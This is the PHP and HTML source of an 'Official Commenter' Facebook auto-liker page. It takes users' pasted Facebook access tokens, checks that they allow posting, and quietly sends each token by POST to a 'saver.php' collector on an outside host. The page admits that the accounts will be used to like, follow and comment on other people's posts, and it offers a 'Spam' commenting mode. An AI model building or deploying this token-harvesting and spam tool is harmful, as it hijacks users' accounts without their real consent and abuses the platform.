<?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=1');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://yoursite.com/saver.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=2');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=3');
} 
if(isset($_GET['i'])){
        switch($_GET['i']) {
            case 1:
                $errorMsg = "Login Success :)"; // For example
            break;
            case 2:
                $errorMsg = "Please Allow App To Access Your Profile!";
            break;
            case 3:
                $errorMsg = "Comments sent successfully :)";
            break;
            default:
                $errorMsg = "TipsVsTricks.Com was here!";
            break;
        }
         ''.$errorMsg.'';
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Official Commenter | Increase Facebook Likes</title>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/bootstrap-responsive.css" rel="stylesheet">
    <link href="assets/css/flat-ui.css" rel="stylesheet">
    <link href="assets/css/flatten.css" rel="stylesheet">
    <link href="assets/css/flat-prettify.css" rel="stylesheet">
    <link href="assets/css/font-awesome.min.css" rel="stylesheet">
    <link href="assets/css/flatten.css" rel="stylesheet">
    <link href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:700' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Chau+Philomene+One:400,400italic' rel='stylesheet' type='text/css'>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="css/style.css">
	<link rel="stylesheet" href="css/like.css">
    <link rel="stylesheet" href="animate.css">
    <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/skins/colors/red.css" name="colors">
    <link rel="stylesheet" href="css/layout/wide.css" name="layout">
    <!--[if lt IE 9]><script src="js/html5.js"></script><![endif]-->
    <link rel="shortcut icon" href="assets/favicon.png">
</head>
    <body>
        <div id="wrap" class="boxed">
<!--Edit Menu In root/includes/menu.php-->
<?php include 'includes/menu.php';?>
<?php  if(isset($_GET['i']))
{ ?>
<div style="margin-bottom: -1px;" ;="" class="alert alert-success hideit"><i class="icon-check"></i><p><?php 
echo "$errorMsg"; 
?></p></div>
<?php } ?>

<div class="page-title"><div class="container clearfix"><div class="sixteen columns"><div id="user-img"><img style="box-shadow:0px 5px 25px #000;height: 150px;float: left;max-width: 172px;" class="animated swing" src="https://graph.facebook.com/me/picture?width=200&height=200&access_token=<?php echo $token;?>"><h3 class="newstyle" style="margin-left: -1px;">
<span class="newstyle-text animated swing"><?php echo "".$user->first_name; ?></span></h3></div><h1 style="float:right;"><a style="color: #FFF;padding: 10px 20px;  background: rgba(0,0,0,.5);  line-height: 75px;  font-size: 15px; text-transform: uppercase;  letter-spacing: 2px;  font-family: 'Open Sans Condensed', sans-serif;  font-weight: 300;" href="logout.php">Logout <span class="fa fa-sign-out"></span></a></h1></div></div></div>
<style> .alert1 { display: none;}</style>
<center>
<div class="site_ads">
<!-- Ads Here -->
</div>
</center>
<br>
<center>
<center>
<center>                                <center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>
                            </center><br><center><div id="containerx"><div id="lol1"><center><br><h2 class="font" style=" font-size: 46px;color: #FFF;"><span class="fa fa-user"></span> Welcome <?php echo "".$user->first_name; ?> To Official Liker</h2></center></div><div id="lol2"><center style="font-family: 'Open Sans Condensed', sans-serif;font-weight: 300;font-size:21px;">	
<noscript>&lt;div class="alert alert-danger"&gt;Please Enable Javascript in your browser to use official liker!&lt;/div&gt;</noscript>							<b>Thanks For Using Our Site <b><span style="color:black;">www.tipsvstricks.com</span></b><br>- We hope you to share this to your friends. The more you share, The more Likes you will have,<br>Please be aware that your account will also be used to <b><span style="color:black;">LIKE,FOLLOW,COMMENT</span></b> other people posts <br>Select Our Service Below :)<br><hr><a href="rcomment.php" onclick="open1111()" style="padding: 30px;font-size: 44px;" class="btn btn-inverse btn-large"><b>Auto Commenter</b></a><br><br><br><nav class="main-nav clearfix" style="
    width: 103.8%;
    margin-left: -14px;
    font-size: 15px;
">
    <div class="menu-menu-1-container">
        <ul id="menu-menu-1" class="menu">
            <li style="background2: #3fbd98;" id="menu-item-695" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-695"><a href="ecomment.php">English</a>
            </li><li style="background2: #3fbd98;" id="menu-item-695" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-695"><a href="scomment.php">Spam</a>
            </li><li style="background2: #3fbd98;" id="menu-item-695" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-695"><a href="pcomment.php">Punjabi</a>
            </li>
<li id="menu-item-695" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-695"><a href="hcomment.php">Hindi</a>
            </li>
            <li style="
    border-right: 1px solid #2e9b7a;
" id="menu-item-695" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-695"><a href="//tipsvstricks.com">Get Free Scripts</a>
            </li>
        </ul>
    </div>
</nav><br><hr>
<br>
</b></center><b>
</b></div><b>
</b></div><b>
</b></center><b>
<center>
    <div id="checking" style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
        <div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
            <center><i class="fa fa-spinnerXD fa-refresh fa-7x fa-spin" style="color:#000;font-size: 150px;"></i>
            </center>
        </div>
    </div>
</center><br><br>
                                <center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>
                            <br>

<div style="display:none;"><?php if ($token){echo " ".$user->first_name;}else{ ?></div>
<?php
		}
		?>
		<?php if ($token): ?>
		<?php else: ?>
		<script type="text/javascript">
// Change this with your URL
window.location.replace("http://yoursite.com/index.php?i=4");
</script>
		<?php endif ?>

</center>

<br><br>
                                <center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>
                            <br>
<!--tutorial-->
<div class="welcome" style=" margin-bottom: -40px;box-shadow: 6px -6px 45px -21px;">
    <div id="tutorial-text" class="tutorial-text">
        <Center>
            <h1><span class="color">*</span>Need Help? See This <a onclick="window.open('http://facebook.com/newdpliker')" title="ScreenShoot Tutorial About How To Use Official Liker?" style="color:#000;">Article</a> OR <a onClick="tutorial()">Video</a> For Getting Started.</h1>
            <hr>
    </div>
    <div style="display:none;" id="tutorial-textt" class="tutorial-textt">
        <Center>
            <h1><span class="color">* </span><a onClick="tutorialhide()"> Need Help? Watch Video Click Here To Hide It</a></h1>
            <hr>
    </div>
    <center>
        <div id="tutorial" style="display:none;" class="tutorial">
          <iframe frameborder="0" height="373" src="http://player.vimeo.com/video/85419887?byline=0&amp;portrait=0" width="596px"></iframe> 
        </div>
<input type="hidden" name="IL_RELATED_TAGS" value="1"/>
<input type="hidden" name="IL_IN_TAG" value="2"/>
    </center>
    </center>
    </center>
    </center>
    <!-- tutorial end -->

    </div>   </div>  
<!--Edit Footer In root/includes/footer.php-->
<?php include 'includes/footer.php';?>
<script src="js/jquery-1.4.2.min.js"></script>
<script src="js/jquery.effects.core.js"></script>
<script src="js/jquery.effects.pulsate.js"></script>
    <script src="js/LOL.js"></script>
    <script src="js/jquery.easing.1.3.min.js"></script>
    <script src="js/jquery-ui/jquery.ui.core.js"></script>
    <script src="js/jquery-ui/jquery.ui.widget.js"></script>
	<script src="js/jquery-log.js"></script>
    <script src="js/jquery-ui/jquery.ui.accordion.js"></script>
    <script src="js/jquery-cookie.js"></script>
    <script src="js/ddsmoothmenu.js"></script>
     <script src="js/colortip.js"></script>
    <script src="js/tytabs.js"></script> 
    <script src="js/jquery.ui.totop.js"></script>
    <script src="js/carousel.js"></script>
    <script src="js/jquery.isotope.min.js"></script>
                             
</body>
</html>